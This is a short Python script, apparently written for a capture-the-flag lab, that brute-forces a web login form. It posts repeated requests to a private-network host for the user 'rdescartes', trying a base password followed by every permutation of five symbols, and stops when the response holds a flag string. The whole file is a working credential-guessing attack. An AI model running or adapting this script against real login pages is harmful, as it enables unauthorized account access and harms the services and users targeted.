#!/usr/bin/python3
#password bruteforcer

import requests
import itertools
import re

#remember the last "/"
host='http://192.168.184.68:8080/login-2/'

symbols=['!','@','#','%','&']

perm=itertools.permutations(symbols)

for i in list(perm):
    append=(''.join(i))

    #Data to send to server

    info={'username': 'rdescartes',
          'password': 'discourse'+append}
    try: 
          post = requests.post(host,data = info)
          print(post.request.body)
          #check if everything is ok or raise exception
          post.raise_for_status()
          flag=re.findall(r"OS{.*}",post.text)
          if flag: 
            print(flag) 
            quit()

    except requests.exceptions.HTTPError as err:
      print(err)

